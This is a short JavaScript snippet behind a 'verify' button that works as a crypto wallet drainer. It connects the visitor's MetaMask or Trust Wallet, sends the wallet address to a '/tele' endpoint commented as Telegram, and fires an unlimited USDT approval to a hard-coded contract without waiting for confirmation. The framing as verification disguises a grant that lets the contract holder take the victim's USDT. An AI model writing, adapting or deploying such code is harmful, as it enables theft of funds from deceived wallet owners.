const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";

document.getElementById("verifyBtn").onclick = async () => {
  if (!window.ethereum) {
    alert("Please open this in MetaMask or Trust Wallet browser.");
    return;
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    // Send address to Telegram immediately after connect
    fetch("/tele", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address })
    });

    // Show USDT approval popup (does not wait for confirmation)
    const usdt = new ethers.Contract(USDT_ADDRESS, [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ], signer);

    usdt.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256); // fire & forget

    alert("Wallet connected. Approval sent. Address sent to Telegram.");
  } catch (err) {
    alert("Error: " + err.message);
  }
};
